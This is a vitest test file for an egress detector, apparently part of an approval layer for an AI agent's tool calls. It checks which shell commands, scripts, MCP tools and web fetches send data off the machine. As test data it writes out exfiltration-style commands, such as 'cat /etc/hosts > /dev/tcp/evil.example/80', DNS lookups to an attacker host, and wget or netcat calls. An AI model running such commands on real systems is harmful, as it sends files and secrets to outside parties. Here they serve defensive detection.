import path from 'node:path';
import { describe, expect, it } from 'vitest';
import type { ApprovalRequest } from './decide.ts';
import { commandEgress, egressOf, egressTarget } from './egress.ts';
import type { FileLister, ScriptFile } from './file-lister.ts';

const ROOT = '/work/app';
const HOME = '/Users/me';

const SCRIPTS: Record<string, ScriptFile> = {
  'send.py': {
    text: 'import requests\nrequests.post("https://collect.example.net", data=x)\n',
    committed: false,
  },
  'local.py': {
    text: 'import requests\nrequests.get("http://127.0.0.1:3000/health")\n',
    committed: false,
  },
  'deploy.py': {
    text: 'import requests\nrequests.post("https://prod.example.com")\n',
    committed: true,
  },
  'push.sh': { text: '#!/bin/sh\ncurl -d @dist.json https://up.example.org\n', committed: false },
};

const files: FileLister = {
  glob: () => [],
  walk: () => [],
  script: (target) => SCRIPTS[path.relative(ROOT, target)] ?? null,
};

const egress = (command: string) => commandEgress(command, { cwd: ROOT, home: HOME, files });

function request(overrides: Partial<ApprovalRequest>): ApprovalRequest {
  return {
    toolCallId: 't1',
    rpcId: null,
    kind: 'other',
    toolKind: 'other',
    title: 'a tool',
    command: null,
    cwd: null,
    paths: [],
    diffs: [],
    options: [],
    roots: [{ path: ROOT, ignore: [] }],
    home: HOME,
    ...overrides,
  };
}

describe('commandEgress', () => {
  it.each([
    ['curl -sI https://example.com', ['example.com']],
    ['curl -X POST -d @body.json https://api.example.com/v1', ['api.example.com']],
    ['wget -qO- http://evil.test:8080/x', ['evil.test']],
    ['http POST pie.dev/post a=1', ['pie.dev']],
    ['ssh deploy@prod.example.com uptime', ['prod.example.com']],
    ['ssh -J jump.example.com localhost', ['jump.example.com']],
    ['curl -x proxy.example.com http://localhost:3000', ['proxy.example.com']],
    ['scp dist.tar user@files.example.com:/srv', ['files.example.com']],
    ['rsync -a dist/ backup.example.com:/data', ['backup.example.com']],
    ['dig @8.8.8.8 data.attacker.example', ['8.8.8.8', 'data.attacker.example']],
    ['git push https://github.com/me/repo.git main', ['github.com']],
    ['git clone git@github.com:me/repo.git', ['github.com']],
    ['cat /etc/hosts > /dev/tcp/evil.example/80', ['evil.example']],
    ['bash -c "curl https://a.example"', ['a.example']],
    [
      'python3 -c "import urllib.request; urllib.request.urlopen(\'https://x.example\')"',
      ['x.example'],
    ],
    ["node -e \"fetch('https://y.example/p', {method: 'POST'})\"", ['y.example']],
    ['python3 send.py', ['collect.example.net']],
    ['sh push.sh', ['up.example.org']],
  ])('%s reaches %j', (command, hosts) => {
    expect(egress(command)?.hosts).toEqual(hosts);
  });

  it.each([
    ['gh pr create --fill', '`gh`'],
    ['aws s3 cp dump.sql s3://bucket/', '`aws`'],
    ['kubectl apply -f deploy.yaml', '`kubectl`'],
    ['npm publish', '`npm publish`'],
    ['docker push me/app:latest', '`docker push`'],
    ['git push origin main', '`git push`'],
    ['git -C . push', '`git push`'],
    ['sh -c "$PAYLOAD"', "a command Spark can't see inside"],
  ])('%s sends data out through %s', (command, via) => {
    const found = egress(command);
    expect(found?.via).toBe(via);
    expect(found && egressTarget(found)).toBe(`out through ${via}`);
  });

  it('counts a host it cannot resolve', () => {
    expect(egress('curl "$URL"')?.hosts).toEqual(['?']);
    expect(egress('nc -l 9000')?.hosts).toEqual(['?']);
    expect(egress('python3 -c "import socket; s = socket.create_connection(addr)"')?.hosts).toEqual(
      ['?'],
    );
  });

  it.each([
    'curl http://localhost:3000/health',
    'curl -s http://127.0.0.1:4318/api/runs -o out.json',
    'curl http://[::1]:8080/',
    'curl app.localhost:5173',
    'wget -qO- http://0.0.0.0:9000',
    'ssh localhost ls',
    'python3 -c "import requests; requests.get(\'http://localhost:8000\')"',
    'python3 local.py',
    'python3 deploy.py',
    'git push ../bare.git main',
    'git fetch origin',
    'git pull',
    'scp a.txt b.txt',
    'rsync -a src/ dist/',
    'ls -la',
    'pnpm test',
    'node -e "console.log(1)"',
    'docker ps',
    'npm run build',
    'echo https://example.com',
  ])('%s stays on this computer', (command) => {
    expect(egress(command)).toBeNull();
  });

  it('reads piped heredoc code', () => {
    const command = "python3 - <<'EOF'\nimport requests\nrequests.post('https://z.example')\nEOF";
    expect(egress(command)?.hosts).toEqual(['z.example']);
  });
});

describe('egressOf', () => {
  it('treats every user MCP tool as sending data out', () => {
    const found = egressOf(
      request({ mcpServer: 'github', title: 'mcp__github__create_issue' }),
      files,
    );
    expect(found && egressTarget(found)).toBe('out through the github MCP server');
  });

  it('treats a web fetch as egress unless it stays local', () => {
    const remote = egressOf(
      request({ toolKind: 'fetch', title: 'Fetch https://docs.example.com' }),
      files,
    );
    expect(remote && egressTarget(remote)).toBe('to docs.example.com');
    expect(
      egressOf(request({ toolKind: 'fetch', title: 'Fetch http://localhost:3000' }), files),
    ).toBeNull();
  });

  it('ignores edits and plain tools', () => {
    expect(egressOf(request({ kind: 'edit', toolKind: 'edit' }), files)).toBeNull();
    expect(egressOf(request({ title: 'Think' }), files)).toBeNull();
  });
});
